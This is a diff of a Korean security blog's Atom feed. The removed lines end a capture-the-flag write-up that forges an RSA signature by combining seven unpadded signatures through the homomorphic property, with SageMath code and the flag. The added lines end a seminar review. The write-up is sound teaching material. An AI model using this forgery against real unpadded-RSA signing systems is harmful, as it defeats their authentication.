-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/022_m_sign.png&quot; alt=&quot;022_m_sign.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/023_find_m.png&quot; alt=&quot;023_find_m.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/024_original_signature.png&quot; alt=&quot;024_original_signature.png&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;(현재로써는 곱하기, 나누기 중 어떤 연산자가 들어가야 하는지 모르기 때문에 물음표(’?’)로 두었다.)&lt;/p&gt;
-
-&lt;p&gt;평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; (target)과 일치하는 수를 구하기 위해서는 약간의 머리를 써서 7 개의 평문을 곱하고 나누면 된다. 나의 경우에는 작은 소인수를 가진 평문부터 순서대로 나열해보았다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pt2   : 2 * 61 * 197
-pt5   :     61 * 197^2 * 811
-pt7   :          197   * 811 * 947
-pt1   :                  811 * 947^3 * 970111
-pt4   :                        947   * 970111 * 2098711
-pt3   :                                970111 * 2098711^2 * 2854343
-pt6   :                                         2098711   * 2854343 * 9605087
------------------------------------------------------------------------------
-target: 2      * 197         * 947            * 2098711             * 9605087
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;이제 곱하기, 나누기를 이용하여 target 과 일치하는 수를 만들면 된다.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    pt2: 2 * 61 * 197
-(/) pt5:     61 * 197^2    * 811
------------------------------------------------------------------------------------------
-         2      * 197^(-1) * 811^(-1)
-(*) pt7:          197      * 811      * 947
------------------------------------------------------------------------------------------
-         2                            * 947
-(*) pt7:          197      * 811      * 947
------------------------------------------------------------------------------------------
-         2      * 197      * 811      * 947^2
-(/) pt1:                     811      * 947^3    * 970111
------------------------------------------------------------------------------------------
-         2      * 197                 * 947^(-1) * 970111^(-1)
-(*) pt4:                                947      * 970111 * 2098711
------------------------------------------------------------------------------------------
-         2      * 197                                     * 2098711
-(*) pt4:                                947      * 970111 * 2098711
------------------------------------------------------------------------------------------
-         2      * 197                 * 947      * 970111 * 2098711^2
-(/) pt3:                                           970111 * 2098711^2 * 2854343
------------------------------------------------------------------------------------------
-         2      * 197                 * 947                           * 2854343^(-1)
-(*) pt6:                                                    2098711   * 2854343 * 9605087
------------------------------------------------------------------------------------------
- answer: 2      * 197                 * 947               * 2098711             * 9605087
-
-Therefore, answer = pt2 / pt5 * pt7^2 / pt1 * pt4^2 / pt3 * pt6.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;7 개의 평문을 이용하여 평문 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x686178656c696f6e&lt;/code&gt; (target)과 일치하는 수(answer)를 구했기 때문에 이제 7 개의 서명을 이용하여 동일한 식으로 target 의 서명을 구할 수 있다.&lt;/p&gt;
-
-&lt;p&gt;아래는 target 의 서명과 FLAG 를 구하기 위해 사용한 코드이다.&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Implemented in SageMath
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x686178656c696f6e&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;target: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 7521425229691318126
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;factor(target): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 2 * 197 * 947 * 2098711 * 9605087
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt6&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;answer: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 7521425229691318126
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;factor(answer): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;# 2 * 197 * 947 * 2098711 * 9605087
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Using the same formula as answer including modular n.
-# This is possible because of the homomorphism in unpadded RSA.
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sig2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sig6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;newsig (int): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# 111219533890621461179460792242241632450808153632799554790302537773885731996725665970159819970061237994467913213678895572474822930918390150774003109045699291202079975387595071497569834504251162974827309324614046581068300485342202365281472704413710935864495616184160512233863134373547246784976501532318112012352
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;newsig (hex): &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# 9e61c276f698ec48aab7dabfd663f3b2ee75d31c68bf16f6810a3bb9bb1c377e47b2ae8cd7055c7c5848bbedc94798d2965c38b317e42191df0e3f25ca2ee58c5f3e125745479b337516a13e420da29ba48a92ca2ee9720487cda6cdf070e83a4a251c52e331174a0ef642a97a251462a049347a7db8226d496eb55c15b1d840
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
-Take the least significant 16 bytes of the signature, encode them in lowercase hexadecimal and format it as `LINECTF{sig_lowest_16_bytes_hex}` to obtain the flag.
-E.g. the last signature from the list above would become `LINECTF{174c96f2c629afe74949d97918cbee4a}`.
-&apos;&apos;&apos;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;LINECTF{&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;newsig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;}&apos;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;flag: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# flag:  LINECTF{a049347a7db8226d496eb55c15b1d840}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;aside&gt;
-🚩 FLAG : LINECTF{a049347a7db8226d496eb55c15b1d840}
-
-&lt;/aside&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;결론&quot;&gt;결론&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/025_philip-estrada-vJr3t39a0xw-unsplash_edit.jpg&quot; alt=&quot;025_philip-estrada-vJr3t39a0xw-unsplash_edit.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;지금까지 &lt;strong&gt;RSA&lt;/strong&gt; 란 무엇인지, &lt;strong&gt;키 생성&lt;/strong&gt;, &lt;strong&gt;암/복호화&lt;/strong&gt;, &lt;strong&gt;서명/검증&lt;/strong&gt;은 어떻게 이루어지는지 알아보았고, 또 대수학에서의 &lt;strong&gt;준동형 사상(Homomorphism)&lt;/strong&gt; 개념을 CTF 에서 자주 출제되는 유형의 RSA 문제에 적용하여 풀어보았다. 이외에도 수많은 방식의 RSA 공격 기법들이 존재하지만 대부분 위 문제 풀이에서 본 것과 같이 수학적인 개념을 가지고 사칙연산만 할 줄 안다면 금방 이해하고 그것을 문제에 적용할 수 있을 것이다.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;암호&lt;/strong&gt;를 푼다는 것은 &lt;strong&gt;얽히고설킨 실타래를 푸는 것&lt;/strong&gt;과도 같다고 생각한다. 처음 문제를 접했을 때는 도무지 어떻게 이것을 풀어야 한다는 건지 감을 잡을 수조차 없지만 천천히 둘러보다 보면 문제를 해결할 수 있는 &lt;strong&gt;실마리&lt;/strong&gt;를 잡을 수 있을 것이다. 이 글이 암호학 문제를 푸는 이들에게 좋은 시작점이 되기를 기원하며 글을 마무리하도록 하겠다.&lt;/p&gt;</content><author><name>박지원</name></author><category term="R&amp;D" /><summary type="html">Homomorphism in RSA</summary></entry></feed>
+&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=12465&quot;&gt;3:27:38&lt;/a&gt;부터 호정님의 발표가 시작됩니다. 평소 Blockchain에 대해서 관심있는 분들이라면 한번 시청해보시는것을 추천드립니다. 💰&lt;/p&gt;
+
+&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
+
+&lt;p&gt;이제 첫번째 Stealien Securit Seminar를 모두 돌아 봤습니다. 흥미진진한 주제로 발표해 주신 발표자님들 모두에게 감사드리며, 스틸리언에 관심을 가져주시고 방문해주신 분들에게 무한한 감사를 보냅니다. 또한, 비록 현장에 계시진 못했지만 온라인으로 저희를 응원해 주신 분들에게도 감사를 드립니다.&lt;/p&gt;
+
+&lt;p&gt;앞으로도 멋지게 발전해 나가는 스틸리언과 스틸리언의 해커들이 되도록 하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;감사합니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;footnotes&quot;&gt;Footnotes&lt;/h2&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;Stealien Security Leader, 스틸리언 주관 멘토링 프로그램 &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1Mk46m5tFapZZ0y4upKxD3R6YsXb4EVZ1/view?usp=sharing&quot;&gt;Paper: 권한 상승 취약점 점검 가이드 및 탐지 방법 제안&lt;/a&gt;, &lt;a href=&quot;https://drive.google.com/file/d/1LscZyKqve60LQsPU98-RgONbP43Mivy1/view?usp=sharing&quot;&gt;Doc: 권한 상승 취약점 점검 가이드&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>김도현</name></author><category term="R&amp;D" /><summary type="html">Stealien Security Seminar 1회 리뷰</summary></entry></feed>
